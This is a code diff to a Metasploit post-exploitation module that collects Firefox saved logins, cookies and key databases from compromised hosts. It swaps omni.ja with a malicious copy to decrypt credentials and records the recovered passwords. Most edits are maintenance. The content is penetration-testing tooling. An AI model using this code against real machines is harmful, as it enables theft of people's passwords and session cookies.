@@ -26,7 +26,7 @@ class Metasploit3 < Msf::Post
   include Msf::Auxiliary::Report
   include Msf::Post::Windows::UserProfiles
 
-  def initialize(info={})
+  def initialize(info = {})
     super(update_info(info,
       'Name'           => 'Multi Gather Firefox Signon Credential Collection',
       'Description'    => %q{
@@ -125,8 +125,8 @@ class Metasploit3 < Msf::Post
       end # session.type == "meterpreter"
 
       session.type == "meterpreter" ? (size = "(%s MB)" % "%0.2f" % (session.fs.file.stat(@paths['ff'] + org_file).size / 1048576.0)) : (size = "")
-      print_status("Downloading: #{@paths['ff'] + org_file} %s" % size)
       tmp = Dir::tmpdir + "/" + new_file          # Cross platform local tempdir, "/" should work on Windows too
+      print_status("Downloading #{@paths['ff'] + org_file} to: #{tmp} %s" % size)
 
       if session.type == "meterpreter"            # If meterpreter is an option, lets use it!
         session.fs.file.download_file(tmp, @paths['ff'] + org_file)
@@ -160,7 +160,7 @@ class Metasploit3 < Msf::Post
         return
       end
 
-      print_status("Uploading #{tmp} to: #{@paths['ff']}")
+      print_status("Uploading #{tmp} to: #{@paths['ff'] + new_file}")
       print_warning("This may take some time...") if @platform =~ /unix|osx/
       if session.type == "meterpreter"
         session.fs.file.upload_file(@paths['ff'] + new_file, tmp)
@@ -249,11 +249,9 @@ class Metasploit3 < Msf::Post
 
     userdirs.each_line do |dir|
       dir.chomp!
-      next if dir == "." || dir == ".."
-      next if dir =~ /No such file/i
+      next if dir == "." || dir == ".." || dir =~ /No such file/i
 
       dir =~ /^\/root$/ ? (basepath = "/#{id}") : (basepath = "#{home + dir}")
-
       @platform == :osx ? (basepath = "#{basepath}/Library/Application\\ Support/Firefox/Profiles/") : (basepath = "#{basepath}/.mozilla/firefox/")
 
       print_status("Checking for Firefox profile in: #{basepath}")
@@ -347,7 +345,7 @@ class Metasploit3 < Msf::Post
 
       files.each do |file|
       file.chomp!
-        if file =~ /^key\d\.db$/ or file =~ /^signons.sqlite$/i or file =~ /^cookies\.sqlite$/ or file =~ /^cert\d\.json$/ or file =~ /^logins\.json$/
+        if file =~ /^key\d\.db$/ or file =~ /^cert\d\.db$/ or file =~ /^signons.sqlite$/i or file =~ /^cookies\.sqlite$/ or file =~ /^logins\.json$/
           vprint_status("Downloading: #{file}")
           if session.type == "meterpreter"
             file = path + "\\" + file
@@ -550,7 +548,6 @@ Components.utils.import("resource://gre/modules/XPCOMUtils.jsm");
 
   # Starts a new Firefox process and triggers decryption
   def decrypt_trigger_decrypt(org_file, new_file, temp_file)
-
     [org_file, new_file, temp_file].each do |f|
       f.insert(0, @paths['ff'])
     end
@@ -610,6 +607,7 @@ Components.utils.import("resource://gre/modules/XPCOMUtils.jsm");
     #   omni.ja (evil)               -> *random*.ja (pointless temp file)
     #   orgomni.ja (original_backup) -> omni.ja (original)
     #
+    vprint_status("Renaming .JA files")
     rename_file(org_file, temp_file)
     rename_file(new_file, org_file)
 
@@ -630,7 +628,7 @@ Components.utils.import("resource://gre/modules/XPCOMUtils.jsm");
     print_error("Missing loot file. Something went wrong.") if !session.fs.file.exists?(@paths['loot'])
     end # session.type == "meterpreter"
 
-    print_status("Restoring original: #{temp_file}")
+    print_status("Restoring original .JA: #{temp_file}")
     rename_file(org_file, new_file)
     rename_file(temp_file, org_file)
 
@@ -687,8 +685,26 @@ Components.utils.import("resource://gre/modules/XPCOMUtils.jsm");
     creds.each do |cred|
       hostname, user, pass = cred.rstrip.split(" :: ")
       cred_table << [hostname, user, pass]
+
+      # Creds API
+      service_data = {
+        workspace_id: myworkspace_id
+      }
+
+      credential_data = {
+        origin_type: :session,
+        session_id: session_db_id,
+        post_reference_name: self.refname,
+        smodule_fullname: self.fullname,
+        username: user,
+        private_data: pass,
+        private_type: :password
+      }.merge(service_data)
+
+      create_credential(credential_data)
     end
 
+    # Create local loot csv file
     path = store_loot(
       "firefox.creds",
       "text/plain",
